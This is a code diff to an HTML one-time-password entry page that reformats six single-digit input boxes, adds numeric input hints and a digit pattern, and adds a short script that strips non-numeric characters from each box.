@@ -140,13 +140,24 @@
 
             <form>
                 <div class="otp-container">
-                    <input type="text" maxlength="1" class="otp-input" id="otp1" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-input" id="otp2" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-input" id="otp3" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-input" id="otp4" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-input" id="otp5" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-input" id="otp6" autocomplete="off">
-                </div>
+			    <input type="text" maxlength="1" class="otp-input" id="otp1"
+			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
+			
+			    <input type="text" maxlength="1" class="otp-input" id="otp2"
+			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
+			
+			    <input type="text" maxlength="1" class="otp-input" id="otp3"
+			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
+			
+			    <input type="text" maxlength="1" class="otp-input" id="otp4"
+			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
+			
+			    <input type="text" maxlength="1" class="otp-input" id="otp5"
+			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
+			
+			    <input type="text" maxlength="1" class="otp-input" id="otp6"
+			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
+			</div>
                 
                 <div style="display:none;" id="otp-error" class="error-message"> </div>
 
@@ -166,7 +177,15 @@
     </div>
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="assets/emit.js"></script> 
+    <script src="assets/emit.js"></script>
+    <script>
+document.querySelectorAll('.otp-input').forEach(input => {
+    input.addEventListener('input', function () {
+        // Keep only one numeric digit
+        this.value = this.value.replace(/\D/g, '').slice(0, 1);
+    });
+});
+</script>
     <script>
 page = "otp";
 
